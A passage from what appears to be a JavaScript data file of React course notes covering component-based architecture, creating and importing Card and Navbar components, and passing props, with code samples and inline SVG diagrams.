                  <li>If you need five more cards, you might be tempted to copy-paste that card markup five times inside <code>App.jsx</code>.</li>
                  <li><strong>The Critical Flaw:</strong> <code>App.jsx</code> is your application's <strong>root entry orchestrator</strong>. Dumping raw markup directly into <code>App.jsx</code> creates a sprawling 500-line monolith where updating a button or card design requires making manual edits in dozens of different places.</li>
                  <li><strong>The Solution:</strong> Embrace <strong>Component-Based Architecture</strong>—extract individual UI blocks into dedicated, single-responsibility component files.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 10.1 · Monolithic Copy-Paste Sprawl vs. Clean Modular Component Architecture</span>
                <span class="diagram-frame-tag">ARCHITECTURAL DESIGN PATTERNS</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram contrasting a monolithic App.jsx full of copy-pasted HTML with a modular App.jsx importing separate components">
                  <!-- Bad: Monolith -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="115" height="22" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
                    <text x="72.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">ANTI-PATTERN</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Monolithic Sprawling App.jsx</text>

                    <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="25" y="94" class="svg-mono-xs" style="fill:var(--danger);">App.jsx (500+ Lines of Clutter)</text>
                    <text x="35" y="112" class="svg-mono-xs" style="fill:var(--text-muted);">├── 50 lines: Nav markup clutter</text>
                    <text x="35" y="130" class="svg-mono-xs" style="fill:var(--text-muted);">├── 120 lines: Duplicate Card HTML</text>
                    <text x="35" y="148" class="svg-mono-xs" style="fill:var(--text-muted);">└── 80 lines: Footer markup clutter</text>
                  </g>

                  <!-- Good: Modular Components -->
                  <g transform="translate(460, 20)">
                    <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="167" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="98.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">RECOMMENDED PATTERN</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--success);">Clean Component Architecture</text>

                    <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="94" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">App.jsx (Clean 20-Line Orchestrator)</text>
                    <text x="35" y="112" class="svg-mono-xs" style="fill:var(--primary);">&lt;Navbar /&gt;</text>
                    <text x="35" y="130" class="svg-mono-xs" style="fill:var(--accent);">&lt;Card /&gt;  &lt;Card /&gt;  &lt;Card /&gt;</text>
                    <text x="35" y="148" class="svg-mono-xs" style="fill:var(--text-muted);">&lt;Footer /&gt;</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "10.3",
          title: "What Are Components & Component-Based Architecture?",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>What Is a Component?</strong>
                <ul class="notes-sub-list">
                  <li>A <strong>Component</strong> is a self-contained, independent, and reusable piece of code (a JavaScript function returning JSX) responsible for rendering a specific feature of the UI.</li>
                </ul>
              </li>
              <li><strong>Deconstructing a Production Website (sheryians.com Example):</strong>
                <ul class="notes-sub-list">
                  <li>Rather than thinking of a page as one huge HTML document, break it down into a tree of components:
                    <ul class="notes-sub-list">
                      <li><strong><code>&lt;Navbar /&gt;</code></strong> component (which internally contains a <code>&lt;Logo /&gt;</code> component and a <code>&lt;NavLinks /&gt;</code> component).</li>
                      <li><strong><code>&lt;HeroSection /&gt;</code></strong> component with call-to-action buttons.</li>
                      <li><strong><code>&lt;CourseGrid /&gt;</code></strong> component rendering multiple instances of <strong><code>&lt;CourseCard /&gt;</code></strong>.</li>
                      <li><strong><code>&lt;Footer /&gt;</code></strong> component.</li>
                    </ul>
                  </li>
                </ul>
              </li>
              <li><strong>Major Performance & Re-Rendering Advantage:</strong>
                <ul class="notes-sub-list">
                  <li>Suppose a user receives an unread alert, incrementing the notification count from <code>0</code> to <code>1</code>.</li>
                  <li>In traditional architectures, the entire navbar or whole document might re-render.</li>
                  <li>In React's Component Architecture, <strong>only that single notification badge component re-renders</strong>! The rest of the page (Hero, Cards, Footer) remains completely untouched and idle, delivering massive performance gains.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 10.2 · Component Tree Isolation & Granular Re-rendering Efficiency</span>
                <span class="diagram-frame-tag">TREE RECONCILIATION & ISOLATION</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 240" class="arch-svg" role="img" aria-label="Component tree showing App branching into Navbar, Hero, and CourseGrid. When NotificationBadge changes state, only that single node re-renders">
                  <!-- App Root -->
                  <g transform="translate(370, 15)">
                    <rect x="0" y="0" width="140" height="42" rx="8" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.8"/>
                    <text x="70" y="26" text-anchor="middle" class="svg-title">&lt;App /&gt;</text>
                  </g>

                  <!-- Connectors from App to 3 branches -->
                  <path d="M 440 57 L 440 80 L 160 80 L 160 100" fill="none" stroke="var(--border)" stroke-width="1.8"/>
                  <path d="M 440 57 L 440 100" fill="none" stroke="var(--border)" stroke-width="1.8"/>
                  <path d="M 440 57 L 440 80 L 720 80 L 720 100" fill="none" stroke="var(--border)" stroke-width="1.8"/>

                  <!-- Branch 1: Navbar -->
                  <g transform="translate(85, 100)">
                    <rect x="0" y="0" width="150" height="42" rx="8" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.5"/>
                    <text x="75" y="26" text-anchor="middle" class="svg-title">&lt;Navbar /&gt;</text>
                  </g>

                  <!-- Branch 2: Hero -->
                  <g transform="translate(365, 100)">
                    <rect x="0" y="0" width="150" height="42" rx="8" fill="var(--bg-surface)" stroke="var(--border)" stroke-width="1.5"/>
                    <text x="75" y="26" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-muted);">&lt;HeroSection /&gt; [IDLE]</text>
                  </g>

                  <!-- Branch 3: Courses -->
                  <g transform="translate(645, 100)">
                    <rect x="0" y="0" width="150" height="42" rx="8" fill="var(--bg-surface)" stroke="var(--border)" stroke-width="1.5"/>
                    <text x="75" y="26" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-muted);">&lt;CourseGrid /&gt; [IDLE]</text>
                  </g>

                  <!-- Sub-connectors under Navbar -->
                  <path d="M 160 142 L 160 165 L 80 165 L 80 180" fill="none" stroke="var(--border)" stroke-width="1.5"/>
                  <path d="M 160 142 L 160 165 L 240 165 L 240 180" fill="none" stroke="var(--border)" stroke-width="1.5"/>

                  <!-- Navbar Child 1: Logo (Idle) -->
                  <g transform="translate(15, 180)">
                    <rect x="0" y="0" width="130" height="38" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="65" y="24" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-muted);">&lt;Logo /&gt; [IDLE]</text>
                  </g>

                  <!-- Navbar Child 2: Notification Badge (RE-RENDERS) -->
                  <g transform="translate(165, 180)">
                    <rect x="0" y="0" width="170" height="38" rx="6" fill="var(--accent-light)" stroke="var(--accent)" stroke-width="2"/>
                    <text x="85" y="24" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">🔔 &lt;Badge [ 1 ] /&gt; ⚡</text>
                  </g>

                  <!-- Callout note on right -->
                  <g transform="translate(370, 175)">
                    <rect x="0" y="0" width="480" height="48" rx="8" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-dasharray="3 3"/>
                    <text x="240" y="22" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">GRANULAR ISOLATION: Only &lt;Badge&gt; re-renders</text>
                    <text x="240" y="38" text-anchor="middle" class="svg-sub">All sibling components remain 100% idle with zero layout shifts.</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 11: CREATING, EXPORTING, IMPORTING & REUSING COMPONENTS
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-11-creating-reusing-components-props-intro",
      number: "11",
      shortLabel: "Component Lifecycle & Props Intro",
      title: "Creating, Exporting, Importing & Reusing Components",
      summary: "Building Card.jsx, Navbar.jsx with rafce, Capital Letter naming rule, VS Code auto-import gotchas, and why Props are needed (Instagram feed analogy).",
      subtopicLabels: ["11.1 First Component Card.jsx", "11.2 Navbar.jsx & Auto-Import Rules", "11.3 Reusability & Props Motivation"],
      diagramCount: 2,
      sections: [
        {
          num: "11.1",
          title: "Creating Your First Component (Card.jsx)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Step-by-Step Component Creation Workflow:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Step 1 · Create Components Directory:</strong> Inside your project's <code>src/</code> directory, create a dedicated folder named <strong><code>components/</code></strong> to keep your project organized.</li>
                  <li><strong>Step 2 · Create the Component File:</strong> Inside <code>src/components/</code>, create a new file named <strong><code>Card.jsx</code></strong> (the <code>.jsx</code> extension signifies JavaScript XML).</li>
                  <li><strong>Step 3 · Write the Component Function:</strong>
                    <pre class="notes-code-block"><code>// src/components/Card.jsx
function Card() {
  return (
    &lt;div className="card"&gt;
      &lt;h2&gt;Sarthak Sharma&lt;/h2&gt;
      &lt;p&gt;Full-Stack React Developer&lt;/p&gt;
    &lt;/div&gt;
  );
}

export default Card;</code></pre>
                  </li>
                  <li><strong>Step 4 · Export the Component:</strong> The <code>export default Card;</code> statement exposes the component function so other files across your application can import it.</li>
                  <li><strong>Step 5 · Import and Render Inside App.jsx:</strong>
                    <pre class="notes-code-block"><code>// src/App.jsx
import Card from './components/Card';

function App() {
  return (
    &lt;div&gt;
      &lt;Card /&gt;
    &lt;/div&gt;
  );
}

export default App;</code></pre>
                  </li>
                </ul>
              </li>
            </ul>
          `
        },
        {
          num: "11.2",
          title: "Creating Multiple Components (Navbar.jsx) & Auto-Import Rules",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Building <code>Navbar.jsx</code> with <code>rafce</code>:</strong>
                <ul class="notes-sub-list">
                  <li>Inside <code>src/components/</code>, create <code>Navbar.jsx</code>.</li>
                  <li>Type <strong><code>rafce</code></strong> and press <strong>Enter</strong> to generate boilerplate arrow-function syntax.</li>
                  <li>Add your navigation JSX markup and style it accordingly:
                    <pre class="notes-code-block"><code>// src/components/Navbar.jsx
import React from 'react';

const Navbar = () => {
  return (
    &lt;div className="nav"&gt;
      &lt;h3&gt;OneNightRevise Navigation&lt;/h3&gt;
    &lt;/div&gt;
  );
};

export default Navbar;</code></pre>
                  </li>
                </ul>
              </li>
              <li><strong>The Capital Letter Naming Rule (Crucial!):</strong>
                <ul class="notes-sub-list">
                  <li>React components <strong>MUST ALWAYS</strong> begin with an <strong>Uppercase Letter</strong> (e.g., <code>Navbar</code>, <code>Card</code>, <code>UserProfile</code>).</li>
                  <li><strong>Why?</strong> React's JSX parser treats lowercase tags (like <code>&lt;navbar&gt;</code>, <code>&lt;div&gt;</code>, <code>&lt;button&gt;</code>) as native built-in HTML elements. If a component name starts with a lowercase letter, React attempts to find a matching HTML DOM element instead of invoking your component function!</li>
                </ul>
              </li>
              <li><strong>The VS Code Auto-Import Gotcha:</strong>
                <ul class="notes-sub-list">
                  <li>When you start typing <code>&lt;Navbar</code> inside <code>App.jsx</code>, VS Code suggests an auto-completion that automatically inserts <code>import Navbar from './components/Navbar';</code> at the top.</li>
                  <li><strong>Gotcha:</strong> Auto-import <strong>only works if the target component is already exported</strong> (<code>export default Navbar</code>). If you haven't written the export statement yet, VS Code has no symbol in its index and cannot offer the auto-import suggestion.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 11.1 · Component Module Pipeline: Exporting from components/ to App.jsx</span>
                <span class="diagram-frame-tag">MODULE EXPORT & IMPORT ORCHESTRATION</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram showing Card.jsx and Navbar.jsx exporting components and App.jsx importing them">
                  <!-- Navbar Component File -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="240" height="90" rx="8" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="120" y="24" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">src/components/Navbar.jsx</text>
                    <rect x="15" y="34" width="210" height="42" rx="4" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="120" y="52" text-anchor="middle" class="svg-mono-xs">const Navbar = () =&gt; {...}</text>
                    <text x="120" y="68" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">export default Navbar;</text>
                  </g>

                  <!-- Card Component File -->
                  <g transform="translate(25, 125)">
                    <rect x="0" y="0" width="240" height="90" rx="8" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.6"/>
                    <text x="120" y="24" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">src/components/Card.jsx</text>
                    <rect x="15" y="34" width="210" height="42" rx="4" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="120" y="52" text-anchor="middle" class="svg-mono-xs">function Card() {...}</text>
                    <text x="120" y="68" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">export default Card;</text>
                  </g>

                  <!-- Arrows linking to App.jsx -->
                  <g transform="translate(275, 65)">
                    <line x1="0" y1="0" x2="60" y2="35" stroke="var(--primary)" stroke-width="2"/>
                    <polygon points="60,31 68,39 57,41" fill="var(--primary)"/>
                  </g>
                  <g transform="translate(275, 170)">
                    <line x1="0" y1="0" x2="60" y2="-35" stroke="var(--accent)" stroke-width="2"/>
                    <polygon points="57,-41 68,-39 60,-31" fill="var(--accent)"/>
                  </g>

                  <!-- App.jsx Container -->
                  <g transform="translate(355, 20)">
                    <rect x="0" y="0" width="495" height="195" rx="12" fill="var(--bg-subsection)" stroke="var(--success)" stroke-width="2"/>
                    <rect x="20" y="16" width="140" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="90" y="31" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">ORCHESTRATOR</text>
                    <text x="280" y="32" class="svg-title">src/App.jsx</text>

                    <!-- Code block inside App.jsx -->
                    <rect x="20" y="48" width="455" height="130" rx="8" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="35" y="70" class="svg-mono-xs" style="fill:var(--primary);">import Navbar from './components/Navbar';</text>
                    <text x="35" y="88" class="svg-mono-xs" style="fill:var(--accent);">import Card from './components/Card';</text>
                    <text x="35" y="112" class="svg-mono-xs" style="fill:var(--text);">function App() {</text>
                    <text x="50" y="130" class="svg-mono-xs" style="fill:var(--text);">return &lt;div&gt;&lt;Navbar /&gt;&lt;Card /&gt;&lt;/div&gt;;</text>
                    <text x="35" y="148" class="svg-mono-xs" style="fill:var(--text);">}</text>
                    <text x="35" y="166" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">export default App;</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "11.3",
          title: "Reusability, Independent Updates & The Limitation (Why Props Exist)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>The Power of Reusability & Independent Updates:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Instant Reusability:</strong> Writing <code>&lt;Card /&gt;</code> twice or three times in <code>App.jsx</code> renders three full cards instantly without duplicating any underlying HTML markup.</li>
                  <li><strong>Fault & Update Isolation:</strong> Modifying <code>Navbar.jsx</code> will never break or trigger changes in <code>Card.jsx</code>. Each component has an isolated boundary.</li>
                </ul>
              </li>
              <li><strong>The Critical Hardcoded Data Limitation:</strong>
                <ul class="notes-sub-list">
                  <li>Right now, every instance of <code>&lt;Card /&gt;</code> displays the exact same hardcoded data (<em>"Sarthak Sharma"</em> and the exact same bio paragraph).</li>
                </ul>
              </li>
              <li><strong>The Instagram Feed Analogy (Why Props Are Essential):</strong>
                <ul class="notes-sub-list">
                  <li>Think of real-world applications like <strong>Instagram</strong> (Feed Posts or Stories):
                    <ul class="notes-sub-list">
                      <li>Every single post card in your Instagram feed shares the <strong>exact same visual shell</strong>: user avatar on top left, username, image/video container, like/comment/share buttons, and a caption section.</li>
                      <li>However, Post 1 shows <strong>@virat.kohli</strong> with 2M likes, while Post 2 shows <strong>@nationalgeographic</strong> with wildlife photography and a custom caption!</li>
                    </ul>
                  </li>
                  <li><strong>How React Solves This:</strong> To reuse one unified component shell while passing <strong>different, dynamic data</strong> into each instance, React provides <strong>Props (Properties)</strong>—the core mechanism for component customization covered next!</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 11.2 · Component Reusability & The Hardcoded Limitation: The Instagram Case Study</span>
                <span class="diagram-frame-tag">REUSABILITY PATTERNS & PROPS MOTIVATION</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram showing identical component shells reused across Instagram feed posts, requiring Props to inject dynamic usernames and images">
                  <!-- Post 1 -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="250" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <circle cx="35" cy="32" r="14" fill="var(--primary)"/>
                    <text x="35" y="36" text-anchor="middle" class="svg-mono-xs" style="fill:#fff; font-weight:700;">A</text>
                    <text x="60" y="28" class="svg-title">@alice_dev</text>
                    <text x="60" y="42" class="svg-sub">San Francisco · 2h ago</text>

                    <!-- Image container -->
                    <rect x="15" y="55" width="220" height="70" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="125" y="94" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-muted);">[ Photo: Workspace Setup ]</text>

                    <!-- Action bar -->
                    <text x="25" y="145" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">❤️ 1,240 likes</text>
                    <text x="25" y="165" class="svg-sub">"Shipped my first React app today! 🚀"</text>
                  </g>

                  <!-- Post 2 -->
                  <g transform="translate(315, 20)">
                    <rect x="0" y="0" width="250" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.6"/>
                    <circle cx="35" cy="32" r="14" fill="var(--accent)"/>
                    <text x="35" y="36" text-anchor="middle" class="svg-mono-xs" style="fill:#fff; font-weight:700;">B</text>
                    <text x="60" y="28" class="svg-title">@bob_codes</text>
                    <text x="60" y="42" class="svg-sub">Bengaluru · 4h ago</text>

                    <!-- Image container -->
                    <rect x="15" y="55" width="220" height="70" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="125" y="94" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-muted);">[ Photo: Coffee & Algorithms ]</text>

                    <!-- Action bar -->
                    <text x="25" y="145" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">❤️ 890 likes</text>
                    <text x="25" y="165" class="svg-sub">"Mastering System Design & Queues ☕"</text>
                  </g>

                  <!-- Summary Box: Why Props -->
                  <g transform="translate(605, 20)">
                    <rect x="0" y="0" width="250" height="190" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="167" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="98.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">THE SOLUTION: PROPS</text>
                    <text x="125" y="60" text-anchor="middle" class="svg-title" style="fill:var(--success);">Same Shell · Dynamic Data</text>

                    <rect x="15" y="74" width="220" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="96" class="svg-mono-xs" style="font-weight:700; fill:var(--primary);">&lt;PostCard</text>
                    <text x="35" y="114" class="svg-mono-xs" style="fill:var(--accent);">user="alice_dev"</text>
                    <text x="35" y="132" class="svg-mono-xs" style="fill:var(--accent);">likes={1240}</text>
                    <text x="25" y="152" class="svg-mono-xs" style="font-weight:700; fill:var(--primary);">/&gt;</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 12: WHAT ARE PROPS? (THE FUNCTION PARAMETER ANALOGY)
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-12-what-are-props-function-parameter",
      number: "12",
      shortLabel: "What Are Props?",
      title: "What Are Props? (The Function Parameter Analogy)",
      summary: "Definition of Props (Properties), the abc(10) JavaScript function argument analogy, passing props from parent App.jsx to child Card.jsx, strings vs. curly braces {}.",
      subtopicLabels: ["12.1 What Are Props?", "12.2 Function Argument Analogy", "12.3 Parent to Child Data Flow"],
      diagramCount: 2,
      sections: [
        {
          num: "12.1",
          title: "What Are Props?",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Props Stands for "Properties":</strong>
                <ul class="notes-sub-list">
                  <li>When you write <code>&lt;Card user="Aman" /&gt;</code> in React, the attribute <code>user="Aman"</code> looks just like a standard HTML attribute (such as <code>class="..."</code> or <code>src="..."</code>).</li>
                  <li>In React, these custom attributes passed into components are called <strong>Props</strong>.</li>
                </ul>
              </li>
              <li><strong>The Core Purpose of Props:</strong>
                <ul class="notes-sub-list">
                  <li>Props enable you to reuse the <strong>exact same component structure and styling</strong> (like a reusable user card, product card, or button) while injecting <strong>different dynamic data</strong> (different usernames, ages, avatar images, prices) into each individual instance.</li>
                  <li>Without props, component reusability would be useless because every card would show identical, hardcoded data.</li>
                </ul>
              </li>
            </ul>
          `
        },
        {
          num: "12.2",
          title: "How Props Work Like JavaScript Function Arguments (abc(10) Analogy)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>The Traditional JavaScript Function Parallel:</strong>
                <ul class="notes-sub-list">
                  <li>Consider a simple JavaScript function with a parameter:
                    <pre class="notes-code-block"><code>function abc(a) {
  console.log('Hello', a);
}

abc(10); // Prints: Hello 10</code></pre>
                  </li>
                  <li>Here, <code>10</code> is the <strong>argument</strong> supplied at the call site, and <code>a</code> is the <strong>parameter</strong> that receives that value inside the function body.</li>
                </ul>
              </li>
              <li><strong>Applying the Exact Same Logic to React:</strong>
                <ul class="notes-sub-list">
                  <li>A React component (like <code>Card</code>) is fundamentally a <strong>JavaScript function</strong>.</li>
                  <li>Writing <code>&lt;Card user="Sarthak" age={18} /&gt;</code> in JSX is simply the JSX syntax for invoking <code>Card({ user: "Sarthak", age: 18 })</code>.</li>
                  <li>Under the hood, React collects all attributes passed to the component tag, bundles them into a single JavaScript object named <strong><code>props</code></strong>, and delivers that object as the first argument to your component function!</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 12.1 · JavaScript Function Arguments vs. React Component Props</span>
                <span class="diagram-frame-tag">FUNCTIONAL PARALLEL & ANALOGY</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Diagram showing the parallel between plain JS function arguments and React component props">
                  <!-- Left: Vanilla JS Function -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">VANILLA JAVASCRIPT</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Function Arguments: abc(10)</text>

                    <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="96" class="svg-mono-xs" style="fill:var(--text);">function <tspan style="fill:var(--primary);" font-weight="700">abc(a)</tspan> {</text>
                    <text x="45" y="116" class="svg-mono-xs" style="fill:var(--text-muted);">console.log('Hello', a);</text>
                    <text x="25" y="136" class="svg-mono-xs">}</text>
                    <text x="25" y="156" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">abc(10); // Argument 10 maps to a</text>
                  </g>

                  <!-- Right: React Component Props -->
                  <g transform="translate(460, 20)">
                    <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--accent-light)" stroke="var(--accent)" stroke-width="1.2"/>
                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">REACT JS PARADIGM</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">Component Props: &lt;Card user="..." /&gt;</text>

                    <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="25" y="96" class="svg-mono-xs" style="fill:var(--text);">function <tspan style="fill:var(--accent);" font-weight="700">Card(props)</tspan> {</text>
                    <text x="45" y="116" class="svg-mono-xs" style="fill:var(--text-muted);">return &lt;h1&gt;{props.user}&lt;/h1&gt;;</text>
                    <text x="25" y="136" class="svg-mono-xs">}</text>
                    <text x="25" y="156" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">&lt;Card user="Sarthak" /&gt; // props.user</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "12.3",
          title: "Passing Props From Parent (App.jsx) to Child (Card.jsx)",
          content: `
            <ul class="notes-bullet-list">
              <li><strong>Unidirectional Data Flow (Top to Bottom):</strong>
                <ul class="notes-sub-list">
                  <li>In React, data strictly flows in one direction: from the <strong>Parent component</strong> down to the <strong>Child component</strong>.</li>
                  <li><strong>Parent (<code>App.jsx</code>):</strong> Responsible for defining and passing the data when rendering each child instance:
                    <pre class="notes-code-block"><code>// src/App.jsx
import Card from './components/Card';

function App() {
  return (
    &lt;div className="container"&gt;
      &lt;Card user="Sarthak" age={18} img="https://images.unsplash.com/photo-1" /&gt;
      &lt;Card user="Aman" age={21} img="https://images.unsplash.com/photo-2" /&gt;
      &lt;Card user="Aditya" age={24} img="https://images.unsplash.com/photo-3" /&gt;
    &lt;/div&gt;
  );
}

export default App;</code></pre>
                  </li>
                </ul>
              </li>
              <li><strong>Syntax Rules for Passing Props:</strong>
                <ul class="notes-sub-list">
                  <li><strong>String Literals:</strong> Plain text values (like usernames or URLs) can be passed directly inside quotes: <code>user="Sarthak"</code> or <code>img="..."</code>.</li>
                  <li><strong>Numbers, Booleans & JavaScript Expressions:</strong> Must be wrapped inside <strong>curly braces <code>{}</code></strong>: <code>age={18}</code>, <code>isMember={true}</code>, or <code>total={10 + 5}</code>.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 12.2 · Parent-to-Child Unidirectional Props Data Flow</span>
                <span class="diagram-frame-tag">COMPONENT HIERARCHY & DATA STREAM</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 240" class="arch-svg" role="img" aria-label="Diagram showing parent App.jsx passing distinct props objects down to three child Card components">
                  <!-- Parent: App.jsx -->
                  <g transform="translate(240, 15)">
                    <rect x="0" y="0" width="400" height="50" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="2"/>
                    <text x="200" y="24" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">PARENT COMPONENT</text>
                    <text x="200" y="42" text-anchor="middle" class="svg-title">src/App.jsx (Data Source)</text>
                  </g>

                  <!-- 3 Downward Arrows with Props Labels -->
                  <!-- Flow to Card 1 -->
                  <path d="M 320 65 L 320 95 L 140 95 L 140 120" fill="none" stroke="var(--primary)" stroke-width="2"/>
                  <polygon points="135,120 140,128 145,120" fill="var(--primary)"/>
                  <rect x="40" y="82" width="234" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--primary)"/>
                  <text x="157" y="97" text-anchor="middle" class="svg-mono-xs" style="font-size:10px; fill:var(--primary);">{ user: "Sarthak", age: 18 }</text>

                  <!-- Flow to Card 2 -->
                  <path d="M 440 65 L 440 120" fill="none" stroke="var(--accent)" stroke-width="2"/>
                  <polygon points="435,120 440,128 445,120" fill="var(--accent)"/>
                  <rect x="340" y="82" width="212" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--accent)"/>
                  <text x="446" y="97" text-anchor="middle" class="svg-mono-xs" style="font-size:10px; fill:var(--accent);">{ user: "Aman", age: 21 }</text>

                  <!-- Flow to Card 3 -->
                  <path d="M 560 65 L 560 95 L 740 95 L 740 120" fill="none" stroke="var(--success)" stroke-width="2"/>
                  <polygon points="735,120 740,128 745,120" fill="var(--success)"/>
                  <rect x="640" y="82" width="227" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--success)"/>
                  <text x="753.5" y="97" text-anchor="middle" class="svg-mono-xs" style="font-size:10px; fill:var(--success);">{ user: "Aditya", age: 24 }</text>

                  <!-- Child 1 -->
                  <g transform="translate(30, 130)">
                    <rect x="0" y="0" width="220" height="90" rx="8" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.5"/>
